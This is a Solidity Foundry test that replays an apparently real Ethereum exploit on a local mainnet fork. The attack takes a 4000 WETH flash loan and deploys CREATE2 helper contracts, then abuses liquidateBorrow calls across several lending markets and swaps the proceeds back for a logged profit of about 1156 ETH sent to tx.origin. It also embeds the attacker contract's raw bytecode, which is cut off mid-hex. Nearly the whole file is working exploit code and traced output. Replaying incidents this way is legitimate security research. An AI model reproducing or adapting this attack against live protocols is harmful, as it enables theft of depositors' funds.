// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
}

// https://explorer.phalcon.xyz/tx/eth/0xf7c21600452939a81b599017ee24ee0dfd92aaaccd0a55d02819a7658a6ef635
// https://etherscan.io/address/0x085bDfF2C522e8637D4154039Db8746bb8642BfF

struct S1 {
    uint256 p1;
    uint256 p2;
    uint256 p3;
    uint256 p4;
    uint256 p5;
    uint256 p6;
    uint256 p7;
    address p8;
    address p9;
}

interface I {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256,
        uint256,
        address[] memory,
        address,
        uint256
    ) external payable;
    function deposit() external payable;
    function redeem(uint256) external payable;
    function approve(address, uint256) external payable;
    function swapExactTokensForTokens(uint256, uint256, address[] memory, address, uint256) external payable;
    function liquidateBorrow(address, address) external payable;
    function transfer(address, uint256) external payable;
    function borrow(uint256) external payable;
    function execute(uint256) external payable;
    function mint(uint256) external payable;
    function balanceOf(address) external payable returns (uint256);
    function enterMarkets(address[] memory) external payable;
    function totalSupply() external payable returns (uint256);
    function getCash() external payable;
    function getAccountSnapshot(address) external payable;
    function redeemUnderlying(uint256) external payable;
    function liquidateCalculateSeizeTokens(address, address, uint256) external payable;
    function liquidateBorrow(address, uint256, address) external payable;
    function getReserves() external payable returns (uint112, uint112, uint32);
    function flashLoanSimple(address, address, uint256, bytes memory, uint16) external payable;
    function withdraw(uint256) external payable;
    function underlying() external payable;
}

contract X526e is Test {
    address immutable r = address(this);
    receive() external payable {}

    function setUp() public pure {
        console2.log("0xf7c21600452939a81b599017ee24ee0dfd92aaaccd0a55d02819a7658a6ef635");
    }

    address constant x0c19 = 0x0C19D213e9f2A5cbAA4eC6E8eAC55a22276b0641;
    address constant x0d4a = 0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852;
    address constant x1933 = 0x1933f1183C421d44d531Ed40A5D2445F6a91646d;
    address constant x2260 = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address constant x4580 = 0x45804880De22913dAFE09f4980848ECE6EcbAf78;
    address constant x5149 = 0x514910771AF9Ca656af840dff83E8264EcF986CA;
    address constant x5fdb = 0x5FdBcD61bC9bd4B6D3FD1F49a5D253165Ea11750;
    address constant x636f = 0x000000000000000000636F6e736F6c652e6c6f67;
    address constant x6982 = 0x6982508145454Ce325dDbE47a25d4ec3d2311933;
    address constant x6b17 = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
    address constant x714b = 0x714bD93aB6ab2F0bcfD2aEaf46A46719991d0d79;
    address constant x7a25 = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address constant x830d = 0x830DAcD5D0a62afa92c9Bc6878461e9cD317B085;
    address constant x8787 = 0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2;
    address constant x8f35 = 0x8f35113cFAba700Ed7a907D92B114B44421e412A;
    address constant x9c4f = 0x9C4Fe5FFD9A9fC5678cFBd93Aa2D4FD684b67C4C;
    address constant xa0b8 = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address constant xa210 = 0xa2107FA5B38d9bbd2C461D6EDf11B11A50F6b974;
    address constant xa43f = 0xA43fe16908251ee70EF74718545e4FE6C5cCEc9f;
    address constant xa478 = 0xA478c2975Ab1Ea89e8196811F51A7B7Ade33eB11;
    address constant xb4e1 = 0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc;
    address constant xbb2b = 0xBb2b8038a1640196FbE3e38816F3e67Cba72D940;
    address constant xbced = 0xbCed4e924f28f43a24ceEDec69eE21ed4D04D2DD;
    address constant xc02a = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant xdac1 = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address constant xdec2 = 0xdec2F31C3984F3440540DC78Ef21b1369d4eF767;
    address constant xfee4 = 0xFEe4428b7f403499C50a6DA947916b71D33142dC;

    address xf8e1;
    address xe495;
    address x4147;
    address xcede;
    address xfbee;
    address xf79c;
    address xdb9b;
    address xe82f;

    function test1() public {
        vm.createSelectFork("http://localhost:18545", 18476512); // tx.blockNumber - 1
        // vm.createSelectFork("http://localhost:18545", bytes32(0xb91e0731a0f1eb0abf884717a065f7282a5daaacd172a0db8d4a61609c978ed8));

        // https://explorer.phalcon.xyz/tx/eth/0xb91e0731a0f1eb0abf884717a065f7282a5daaacd172a0db8d4a61609c978ed8
        this.xb91e0731();
        // https://explorer.phalcon.xyz/tx/eth/0x769850d2ec652ee3b513c45f575f71b3eb5a61aea2db606379f2fbbfe79959be
        this.x769850d2();
        // https://explorer.phalcon.xyz/tx/eth/0xff732b8f33304caeb54ebe2f88b568fb44f966ba7a76a388abe1f62fdbc7e621
        this.xff732b8f();
        bytes32 initcodeHash1 = keccak256(abi.encodePacked(type(Xf8e1).creationCode, abi.encode(r)));
        xf8e1 = address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xff), r, bytes32("1"), initcodeHash1)))));
        bytes32 initcodeHash3 = keccak256(abi.encodePacked(type(Xe495).creationCode, abi.encode(r)));
        xe495 = address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xff), r, bytes32("3"), initcodeHash3)))));
        bytes32 initcodeHash4 = keccak256(abi.encodePacked(type(X4147).creationCode, abi.encode(r)));
        x4147 = address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xff), r, bytes32("4"), initcodeHash4)))));
        bytes32 initcodeHash5 = keccak256(abi.encodePacked(type(Xcede).creationCode, abi.encode(r)));
        xcede = address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xff), r, bytes32("5"), initcodeHash5)))));
        bytes32 initcodeHash7 = keccak256(abi.encodePacked(type(Xf79c).creationCode, abi.encode(r)));
        xf79c = address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xff), r, bytes32("7"), initcodeHash7)))));
        bytes32 initcodeHash2 = keccak256(abi.encodePacked(type(Xdb9b).creationCode, abi.encode(r)));
        xdb9b = address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xff), r, bytes32("2"), initcodeHash2)))));
        bytes32 initcodeHash6 = keccak256(abi.encodePacked(type(Xe82f).creationCode, abi.encode(r)));
        xe82f = address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xff), r, bytes32("6"), initcodeHash6)))));
        // https://explorer.phalcon.xyz/tx/eth/0xf7c21600452939a81b599017ee24ee0dfd92aaaccd0a55d02819a7658a6ef635
        xcb0d9b88();
    }

    function test2() public {
        vm.createSelectFork("http://localhost:18545", 18476507); // tx.blockNumber - 1
        // https://explorer.phalcon.xyz/tx/eth/0xb91e0731a0f1eb0abf884717a065f7282a5daaacd172a0db8d4a61609c978ed8
        this.xb91e0731();
        vm.warp(1698832703);
        vm.roll(18476510);
        // https://explorer.phalcon.xyz/tx/eth/0x769850d2ec652ee3b513c45f575f71b3eb5a61aea2db606379f2fbbfe79959be
        this.x769850d2();
        vm.warp(1698832715);
        vm.roll(18476511);
        // https://explorer.phalcon.xyz/tx/eth/0xff732b8f33304caeb54ebe2f88b568fb44f966ba7a76a388abe1f62fdbc7e621
        this.xff732b8f();
        vm.warp(1698832727);
        vm.roll(18476512);
        bytes32 initcodeHash1 = keccak256(abi.encodePacked(type(Xf8e1).creationCode, abi.encode(r)));
        xf8e1 = address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xff), r, bytes32("1"), initcodeHash1)))));
        bytes32 initcodeHash3 = keccak256(abi.encodePacked(type(Xe495).creationCode, abi.encode(r)));
        xe495 = address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xff), r, bytes32("3"), initcodeHash3)))));
        bytes32 initcodeHash4 = keccak256(abi.encodePacked(type(X4147).creationCode, abi.encode(r)));
        x4147 = address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xff), r, bytes32("4"), initcodeHash4)))));
        bytes32 initcodeHash5 = keccak256(abi.encodePacked(type(Xcede).creationCode, abi.encode(r)));
        xcede = address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xff), r, bytes32("5"), initcodeHash5)))));
        bytes32 initcodeHash7 = keccak256(abi.encodePacked(type(Xf79c).creationCode, abi.encode(r)));
        xf79c = address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xff), r, bytes32("7"), initcodeHash7)))));
        bytes32 initcodeHash2 = keccak256(abi.encodePacked(type(Xdb9b).creationCode, abi.encode(r)));
        xdb9b = address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xff), r, bytes32("2"), initcodeHash2)))));
        bytes32 initcodeHash6 = keccak256(abi.encodePacked(type(Xe82f).creationCode, abi.encode(r)));
        xe82f = address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xff), r, bytes32("6"), initcodeHash6)))));
        // https://explorer.phalcon.xyz/tx/eth/0xf7c21600452939a81b599017ee24ee0dfd92aaaccd0a55d02819a7658a6ef635
        xcb0d9b88();
    }

    function test3() public {
        vm.createSelectFork("http://localhost:18545", 18476512); // tx.blockNumber - 1

        address RECEIVER = address(this);
        vm.warp(1698832727);
        vm.roll(18476513);
        bytes32 initcodeHash1 = keccak256(abi.encodePacked(type(Xf8e1).creationCode, abi.encode(r)));
        vm.deal(RECEIVER, 10 ether);
        vm.store(
            address(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599),
            keccak256(abi.encode(RECEIVER, uint256(0))),
            bytes32(uint256(1000000000000000000000000))
        );
        vm.store(
            address(0x45804880De22913dAFE09f4980848ECE6EcbAf78),
            keccak256(abi.encode(RECEIVER, uint256(1))),
            bytes32(uint256(1000000000000000000000000))
        );
        vm.store(
            address(0x514910771AF9Ca656af840dff83E8264EcF986CA),
            keccak256(abi.encode(RECEIVER, uint256(1))),
            bytes32(uint256(1000000000000000000000000))
        );
        vm.store(
            address(0x5FdBcD61bC9bd4B6D3FD1F49a5D253165Ea11750),
            keccak256(abi.encode(RECEIVER, uint256(14))),
            bytes32(uint256(1000000000000000000000000))
        );
        vm.store(
            address(0x6982508145454Ce325dDbE47a25d4ec3d2311933),
            keccak256(abi.encode(RECEIVER, uint256(0))),
            bytes32(uint256(1000000000000000000000000))
        );
        vm.store(
            address(0x6B175474E89094C44Da98b954EedeAC495271d0F),
            keccak256(abi.encode(RECEIVER, uint256(2))),
            bytes32(uint256(1000000000000000000000000))
        );
        vm.store(
            address(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48),
            keccak256(abi.encode(RECEIVER, uint256(9))),
            bytes32(uint256(1000000000000000000000000))
        );
        vm.store(
            address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2),
            keccak256(abi.encode(RECEIVER, uint256(3))),
            bytes32(uint256(1000000000000000000000000))
        );
        vm.store(
            address(0xdAC17F958D2ee523a2206206994597C13D831ec7),
            keccak256(abi.encode(RECEIVER, uint256(2))),
            bytes32(uint256(1000000000000000000000000))
        );
        xf8e1 = address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xff), r, bytes32("1"), initcodeHash1)))));
        bytes32 initcodeHash3 = keccak256(abi.encodePacked(type(Xe495).creationCode, abi.encode(r)));
        xe495 = address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xff), r, bytes32("3"), initcodeHash3)))));
        bytes32 initcodeHash4 = keccak256(abi.encodePacked(type(X4147).creationCode, abi.encode(r)));
        x4147 = address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xff), r, bytes32("4"), initcodeHash4)))));
        bytes32 initcodeHash5 = keccak256(abi.encodePacked(type(Xcede).creationCode, abi.encode(r)));
        xcede = address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xff), r, bytes32("5"), initcodeHash5)))));
        bytes32 initcodeHash7 = keccak256(abi.encodePacked(type(Xf79c).creationCode, abi.encode(r)));
        xf79c = address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xff), r, bytes32("7"), initcodeHash7)))));
        bytes32 initcodeHash2 = keccak256(abi.encodePacked(type(Xdb9b).creationCode, abi.encode(r)));
        xdb9b = address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xff), r, bytes32("2"), initcodeHash2)))));
        bytes32 initcodeHash6 = keccak256(abi.encodePacked(type(Xe82f).creationCode, abi.encode(r)));
        xe82f = address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xff), r, bytes32("6"), initcodeHash6)))));
        // https://explorer.phalcon.xyz/tx/eth/0xf7c21600452939a81b599017ee24ee0dfd92aaaccd0a55d02819a7658a6ef635
        xcb0d9b88();
    }

    function x769850d2() public {
        xfbee = address(new Xfbee());
    }

    function xcb0d9b88() public {
        I(x8787).flashLoanSimple(r, xc02a, 4000000000000000000000, "", 0);
        // uint256 v1 = 1156934745663858638915;
        uint256 v1 = I(xc02a).balanceOf(r);
        console2.log("I(xc02a).balanceOf(r)\t\t->", "1156934745663858638915 (1156.9347 ether)");
        I(xc02a).withdraw(v1);
        console2.log("[HH SERVER] - Final profit : ", uint256(1156), "ETH sent to", tx.origin);
        console2.log("[HH SERVER] - Total gas used : ", uint256(12020127));
        xfbee.delegatecall(
            abi.encodeWithSignature("stringToAddress(string)", "0x085bDfF2C522e8637D4154039Db8746bb8642BfF")
        );
        xfbee.delegatecall(
            abi.encodeWithSignature("stringToAddress(string)", "0x085bDfF2C522e8637D4154039Db8746bb8642BfF")
        );
        xfbee.delegatecall(
            abi.encodeWithSignature("stringToAddress(string)", "0x085bDfF2C522e8637D4154039Db8746bb8642BfF")
        );
        selfdestruct(payable(address(tx.origin)));
    }

    function xff732b8f() public {
        _constructor_();
    }

    function xb91e0731() public {
        I(xdec2).execute(22);
    }

    function executeOperation(address, uint256, uint256, address, bytes memory) public {
        // uint256 v1 = 4000000000000000000000;
        uint256 v1 = I(xc02a).balanceOf(r);
        console2.log("I(xc02a).balanceOf(r)\t\t->", "4000000000000000000000 (4000.0 ether)");
        // uint112 v2 = 4164649595455583886903251171637;
        // uint112 v3 = 2600447755450115476153;
        // uint32 v4 = 1698832523;
        (uint112 v2, uint112 v3, uint32 v4) = I(xa43f).getReserves();
        console2.log("I(xa43f).getReserves()\t->", v2, v3, v4);
        I(xc02a).approve(x7a25, v1);

        address[] memory arr14 = new address[](2);
        arr14[0] = xc02a;
        arr14[1] = x6982;
        I(x7a25).swapExactTokensForTokens(v1, 2495661644612489444576150283558, arr14, r, block.timestamp + 1);

        // uint256 v5 = 2520870348093423681390050791472;
        uint256 v5 = I(x6982).balanceOf(r);
        console2.log("I(x6982).balanceOf(r)\t\t->", "2520870348093423681390050791472 (2520870348093.4236 ether)");
        I(x6982).transfer(xf8e1, v5);
        xfbee.delegatecall(
            abi.encodeWithSignature("stringToAddress(string)", "0x085bDfF2C522e8637D4154039Db8746bb8642BfF")
        );
        xf8e1 = address(new Xf8e1{salt: bytes32("1")}(r));
        I(x714b).liquidateBorrow{value: 1}(xf8e1, x5fdb);
        // uint256 v6 = 856961701;
        uint256 v6 = I(x5fdb).balanceOf(r);
        console2.log("I(x5fdb).balanceOf(r)\t\t->", uint256(856961701));
        I(x5fdb).redeem(v6);
        I(xc02a).deposit{value: 334476442580295733159}();
        // uint256 v7 = 2520870348093423681390001419194;
        uint256 v7 = I(x6982).balanceOf(r);
        console2.log("I(x6982).balanceOf(r)\t\t->", "2520870348093423681390001419194 (2520870348093.4236 ether)");
        I(x6982).transfer(xdb9b, v7);
        xfbee.delegatecall(
            abi.encodeWithSignature("stringToAddress(string)", "0x085bDfF2C522e8637D4154039Db8746bb8642BfF")
        );
        xdb9b = address(new Xdb9b{salt: bytes32("2")}(r));
        I(x8f35).underlying();
        I(xa0b8).approve(x8f35, type(uint256).max);
        I(x8f35).liquidateBorrow(xdb9b, 1, x5fdb);
        // uint256 v8 = 475206829491924854;
        uint256 v8 = I(x5fdb).balanceOf(r);
        console2.log("I(x5fdb).balanceOf(r)\t\t->", "475206829491924854 (0.4752 ether)");
        I(x5fdb).redeem(v8);
        // uint256 v9 = 513987927003;
        uint256 v9 = I(xa0b8).balanceOf(r);
        console2.log("I(xa0b8).balanceOf(r)\t\t->", uint256(513987927003));
        // uint112 v10 = 29091375957129;
        // uint112 v11 = 16123118472430038282235;
        // uint32 v12 = 1698832655;
        (uint112 v10, uint112 v11, uint32 v12) = I(xb4e1).getReserves();
        console2.log("I(xb4e1).getReserves()\t->", v10, v11, v12);
        I(xa0b8).approve(x7a25, v9);

        address[] memory arr29 = new address[](2);
        arr29[0] = xa0b8;
        arr29[1] = xc02a;
        I(x7a25).swapExactTokensForTokens(v9, 276302320963706182551, arr29, r, block.timestamp + 1);

        // uint256 v13 = 2520870348093396303218754970850;
        uint256 v13 = I(x6982).balanceOf(r);
        console2.log("I(x6982).balanceOf(r)\t\t->", "2520870348093396303218754970850 (2520870348093.3963 ether)");
        I(x6982).transfer(xe495, v13);
        xfbee.delegatecall(
            abi.encodeWithSignature("stringToAddress(string)", "0x085bDfF2C522e8637D4154039Db8746bb8642BfF")
        );
        xe495 = address(new Xe495{salt: bytes32("3")}(r));
        I(xdac1).approve(xbced, type(uint256).max);
        {
            I(xbced).liquidateBorrow(xe495, 1, x5fdb);
            // uint256 v14 = 475389913575613125;
            uint256 v14 = I(x5fdb).balanceOf(r);
            console2.log("I(x5fdb).balanceOf(r)\t\t->", "475389913575613125 (0.4753 ether)");
            I(x5fdb).redeem(v14);
            // uint256 v15 = 249534202650;
            uint256 v15 = I(xdac1).balanceOf(r);
            console2.log("I(xdac1).balanceOf(r)\t\t->", uint256(249534202650));
            // uint112 v16 = 16859178341777973963706;
            // uint112 v17 = 30447305393888;
            // uint32 v18 = 1698832667;
            (uint112 v16, uint112 v17, uint32 v18) = I(x0d4a).getReserves();
            console2.log("I(x0d4a).getReserves()\t->", v16, v17, v18);
            I(xdac1).approve(x7a25, 0);
            I(xdac1).approve(x7a25, v15);

            address[] memory arr37 = new address[](2);
            arr37[0] = xdac1;
            arr37[1] = xc02a;
            I(x7a25).swapExactTokensForTokens(v15, 445, arr37, r, block.timestamp + 1);

            // uint256 v19 = 2520870348093368914499454318244;
            uint256 v19 = I(x6982).balanceOf(r);
            console2.log("I(x6982).balanceOf(r)\t\t->", "2520870348093368914499454318244 (2520870348093.3689 ether)");
            I(x6982).transfer(x4147, v19);
            xfbee.delegatecall(
                abi.encodeWithSignature("stringToAddress(string)", "0x085bDfF2C522e8637D4154039Db8746bb8642BfF")
            );
            x4147 = address(new X4147{salt: bytes32("4")}(r));
            I(x0c19).underlying();
            I(x4580).approve(x0c19, type(uint256).max);
            I(x0c19).liquidateBorrow(x4147, 1, x5fdb);
            // uint256 v20 = 938966478;
            uint256 v20 = I(x5fdb).balanceOf(r);
            console2.log("I(x5fdb).balanceOf(r)\t\t->", uint256(938966478));
            I(x5fdb).redeem(v20);
            // uint256 v21 = 81342867835531271215;
            uint256 v21 = I(x4580).balanceOf(r);
            console2.log("I(x4580).balanceOf(r)\t\t->", "81342867835531271215 (81.3428 ether)");
            // uint112 v22 = 1782148200980007009997;
            // uint112 v23 = 1931934660549049412053;
            // uint32 v24 = 1698830171;
            (uint112 v22, uint112 v23, uint32 v24) = I(x9c4f).getReserves();
            console2.log("I(x9c4f).getReserves()\t->", v22, v23, v24);
            I(x4580).approve(x7a25, v21);

            address[] memory arr45 = new address[](2);
            arr45[0] = x4580;
            arr45[1] = xc02a;
            I(x7a25)
                .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                    v21, 83247620154848579612, arr45, r, block.timestamp + 1
                );

            // uint256 v25 = 2520870348093368914499400221410;
            uint256 v25 = I(x6982).balanceOf(r);
            console2.log("I(x6982).balanceOf(r)\t\t->", "2520870348093368914499400221410 (2520870348093.3689 ether)");
            I(x6982).transfer(xcede, v25);
            xfbee.delegatecall(
                abi.encodeWithSignature("stringToAddress(string)", "0x085bDfF2C522e8637D4154039Db8746bb8642BfF")
            );
            xcede = address(new Xcede{salt: bytes32("5")}(r));
            I(x830d).underlying();
            I(x6b17).approve(x830d, type(uint256).max);
            I(x830d).liquidateBorrow(xcede, 1, x5fdb);
            // uint256 v26 = 475247;
            uint256 v26 = I(x5fdb).balanceOf(r);
            console2.log("I(x5fdb).balanceOf(r)\t\t->", uint256(475247));
            I(x5fdb).redeem(v26);
        }
        {
            // uint256 v27 = 103657601740278955029569;
            uint256 v27 = I(x6b17).balanceOf(r);
            console2.log("I(x6b17).balanceOf(r)\t\t->", "103657601740278955029569 (103657.6017 ether)");
            // uint112 v28 = 5598400325463448935597949;
            // uint112 v29 = 3106195032299145397364;
            // uint32 v30 = 1698831947;
            (uint112 v28, uint112 v29, uint32 v30) = I(xa478).getReserves();
            console2.log("I(xa478).getReserves()\t->", v28, v29, v30);
            I(x6b17).approve(x7a25, v27);

            address[] memory arr53 = new address[](2);
            arr53[0] = x6b17;
            arr53[1] = xc02a;
            I(x7a25).swapExactTokensForTokens(v27, 55738116772044178392, arr53, r, block.timestamp + 1);

            // uint256 v31 = 2520870348093368914499400194030;
            uint256 v31 = I(x6982).balanceOf(r);
            console2.log("I(x6982).balanceOf(r)\t\t->", "2520870348093368914499400194030 (2520870348093.3689 ether)");
            I(x6982).transfer(xe82f, v31);
            xfbee.delegatecall(
                abi.encodeWithSignature("stringToAddress(string)", "0x085bDfF2C522e8637D4154039Db8746bb8642BfF")
            );
            xe82f = address(new Xe82f{salt: bytes32("6")}(r));
            I(x1933).underlying();
            I(x2260).approve(x1933, type(uint256).max);
            I(x1933).liquidateBorrow(xe82f, 1, x5fdb);
            // uint256 v32 = 163733151018638913471;
            uint256 v32 = I(x5fdb).balanceOf(r);
            console2.log("I(x5fdb).balanceOf(r)\t\t->", "163733151018638913471 (163.7331 ether)");
            I(x5fdb).redeem(v32);
            // uint256 v33 = 1312889484;
            uint256 v33 = I(x2260).balanceOf(r);
            console2.log("I(x2260).balanceOf(r)\t\t->", uint256(1312889484));
            // uint112 v34 = 10763120705;
            // uint112 v35 = 2049106228279096242786;
            // uint32 v36 = 1698831779;
            (uint112 v34, uint112 v35, uint32 v36) = I(xbb2b).getReserves();
            console2.log("I(xbb2b).getReserves()\t->", v34, v35, v36);
            I(x2260).approve(x7a25, v33);

            address[] memory arr61 = new address[](2);
            arr61[0] = x2260;
            arr61[1] = xc02a;
            I(x7a25).swapExactTokensForTokens(v33, 219958726341555654786, arr61, r, block.timestamp + 1);

            // uint256 v37 = 2520870348083935728844005359510;
            uint256 v37 = I(x6982).balanceOf(r);
            console2.log("I(x6982).balanceOf(r)\t\t->", "2520870348083935728844005359510 (2520870348083.9357 ether)");
            I(x6982).transfer(xf79c, v37);
            xfbee.delegatecall(
                abi.encodeWithSignature("stringToAddress(string)", "0x085bDfF2C522e8637D4154039Db8746bb8642BfF")
            );
            xf79c = address(new Xf79c{salt: bytes32("7")}(r));
            I(xfee4).underlying();
            I(x5149).approve(xfee4, type(uint256).max);
            I(xfee4).liquidateBorrow(xf79c, 1, x5fdb);
            // uint256 v38 = 5266876;
            uint256 v38 = I(x5fdb).balanceOf(r);
            console2.log("I(x5fdb).balanceOf(r)\t\t->", uint256(5266876));
            I(x5fdb).redeem(v38);
            // uint256 v39 = 10082867210431152021424;
            uint256 v39 = I(x5149).balanceOf(r);
            console2.log("I(x5149).balanceOf(r)\t\t->", "10082867210431152021424 (10082.8672 ether)");
            // uint112 v40 = 92217290806726176451627;
            // uint112 v41 = 566117389839657442564;
            // uint32 v42 = 1698832679;
            (uint112 v40, uint112 v41, uint32 v42) = I(xa210).getReserves();
            console2.log("I(xa210).getReserves()\t->", v40, v41, v42);
            I(x5149).approve(x7a25, v39);

            address[] memory arr69 = new address[](2);
            arr69[0] = x5149;
            arr69[1] = xc02a;
            I(x7a25).swapExactTokensForTokens(v39, 55090032033736613210, arr69, r, block.timestamp + 1);
        }
        {
            // uint256 v43 = 2520870348083935728844005056070;
            uint256 v43 = I(x6982).balanceOf(r);
            console2.log("I(x6982).balanceOf(r)\t\t->", "2520870348083935728844005056070 (2520870348083.9357 ether)");
            // uint112 v44 = 1643779247362160205513200380165;
            // uint112 v45 = 6600447755450115476153;
            // uint32 v46 = 1698832727;
            (uint112 v44, uint112 v45, uint32 v46) = I(xa43f).getReserves();
            console2.log("I(xa43f).getReserves()\t->", v44, v45, v46);
            I(x6982).approve(x7a25, v43);

            address[] memory arr70 = new address[](2);
            arr70[0] = x6982;
            arr70[1] = xc02a;
            I(x7a25).swapExactTokensForTokens(v43, 3950619005376690920220, arr70, r, block.timestamp + 1);

            I(xc02a).approve(x8787, 4002000000000000000000);
        }

        bytes memory rt = hex"0000000000000000000000000000000000000000000000000000000000000001";
        assembly {
            return(add(rt, 0x20), mload(rt))
        }
    }

    function _constructor_() public {
        bytes memory rt =
            hex"608060405260043610620000545760003560e01c80631b11d0ff146200006157806394ca2cb5146200008d578063adc8e9f114620000cb578063cb0d9b8814620000ff578063ee501f68146200012657600080fd5b366200005c57005b600080fd5b6200007862000072366004620026f7565b6200014b565b60405190151581526020015b60405180910390f35b3480156200009a57600080fd5b50620000b2620000ac366004620027c5565b62000332565b6040516001600160a01b03909116815260200162000084565b348015620000d857600080fd5b50620000f0620000ea36600462002868565b62000391565b604051620000849190620028e3565b3480156200010c57600080fd5b50620001246200011e366004620028f8565b62000435565b005b3480156200013357600080fd5b50620000f06200014536600462002868565b620009b9565b6002546000906001600160a01b031633146200016657600080fd5b6040805132602082015201604051602081830303815290604052805190602001207f60b0a6e75438d0e9ba5289b3cbbec031c025c782fdfc91f64d12e671fe40fc6460001b14620001b657600080fd5b620001c0620009cf565b620001ca62000c9e565b600854620001e1906001600160a01b0316620010c9565b620001eb620015ec565b60075462000202906001600160a01b0316620010c9565b6200020c620017c5565b60095462000223906001600160a01b0316620010c9565b6200022d62001a61565b600a5462000244906001600160a01b0316620010c9565b6200024e62001d19565b60065462000265906001600160a01b0316620010c9565b6200026f62001ef2565b600b5462000286906001600160a01b0316620010c9565b62000290620020cb565b6200029a620022a4565b600d546002546001600160a01b039182169163095ea7b39116620002bf888a6200295e565b6040518363ffffffff1660e01b8152600401620002de92919062002974565b6020604051808303816000875af1158015620002fe573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906200032491906200298d565b506001979650505050505050565b8151602080840191909120604080516001600160f81b0319818501523060601b6bffffffffffffffffffffffff191660218201526035810185905260558082019390935281518082039093018352607501905280519101205b92915050565b6060600060405180602001620003a79062002679565b601f1982820381018352601f9091011660408181526001600160a01b038616602083015291925082910160408051601f1981840301815282825273085bdff2c522e8637d4154039db8746bb8642bff6020840152910160408051601f19818403018152908290526200041e939291602001620029b1565b604051602081830303815290604052915050919050565b60005a6000549091506001600160a01b031633146200045357600080fd5b3332146200046057600080fd5b6040805132602082015201604051602081830303815290604052805190602001207f60b0a6e75438d0e9ba5289b3cbbec031c025c782fdfc91f64d12e671fe40fc6460001b14620004b057600080fd5b60408051336020820152600a910160405160208183030381529060405280519060200120901c7e182c29b9d50e343a6e94a26cf2efb00c700971e0bf7f247d9344b99c7f903f60001b03620009b357600254600d5460408051600080825260208201928390526310ac2ddf60e21b9092526001600160a01b03938416936342b0b77c936200054b93309392909116918a9160248201620029fa565b600060405180830381600087803b1580156200056657600080fd5b505af11580156200057b573d6000803e3d6000fd5b5050600d546040516370a0823160e01b81523060048201526001600160a01b039091169250632e1a7d4d915082906370a0823190602401602060405180830381865afa158015620005d0573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190620005f6919062002a45565b6040518263ffffffff1660e01b81526004016200061591815260200190565b600060405180830381600087803b1580156200063057600080fd5b505af115801562000645573d6000803e3d6000fd5b505060408051808201909152601d81527f5b4848205345525645525d202d2046696e616c2070726f666974203a200000006020820152479250620006cc915062000698670de0b6b3a76400008462002a5f565b60408051808201909152600b81526a4554482073656e7420746f60a81b60208201526000546001600160a01b03166200247d565b620007196040518060400160405280601f81526020017f5b4848205345525645525d202d20546f74616c206761732075736564203a20008152505a62000713908562002a82565b620024ca565b73fbeeaa651e5abe3b820ae03cf4db5aecf96babab6315706fdf600186866040516020016200074b9392919062002b3d565b6040516020818303038152906040526040518263ffffffff1660e01b8152600401620007789190620028e3565b602060405180830381865af415801562000796573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190620007bc919062002b5f565b6001600160a01b031673085bdff2c522e8637d4154039db8746bb8642bff6001600160a01b031614620007ee57600080fd5b73fbeeaa651e5abe3b820ae03cf4db5aecf96babab6315706fdf60018686604051602001620008209392919062002b3d565b6040516020818303038152906040526040518263ffffffff1660e01b81526004016200084d9190620028e3565b602060405180830381865af41580156200086b573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019062000891919062002b5f565b6001600160a01b031673085bdff2c522e8637d4154039db8746bb8642bff6001600160a01b031614620008c357600080fd5b73085bdff2c522e8637d4154039db8746bb8642bff3214620008e457600080fd5b73085bdff2c522e8637d4154039db8746bb8642bff33146200090557600080fd5b73fbeeaa651e5abe3b820ae03cf4db5aecf96babab6315706fdf60018686604051602001620009379392919062002b3d565b6040516020818303038152906040526040518263ffffffff1660e01b8152600401620009649190620028e3565b602060405180830381865af415801562000982573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190620009a8919062002b5f565b6001600160a01b0316ff5b50505050565b6060600060405180602001620003a79062002687565b600d546040516370a0823160e01b81523060048201526000916001600160a01b0316906370a0823190602401602060405180830381865afa15801562000a19573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019062000a3f919062002a45565b9050600080601560009054906101000a90046001600160a01b03166001600160a01b0316630902f1ac6040518163ffffffff1660e01b8152600401606060405180830381865afa15801562000a98573d6000803e3d6000fd5b505050506040513d601f19601f8201168201806040525081019062000abe919062002b9c565b5091509150600062000ae484836001600160701b0316856001600160701b031662002517565b6040805160028082526060820183529293506000929091602083019080368337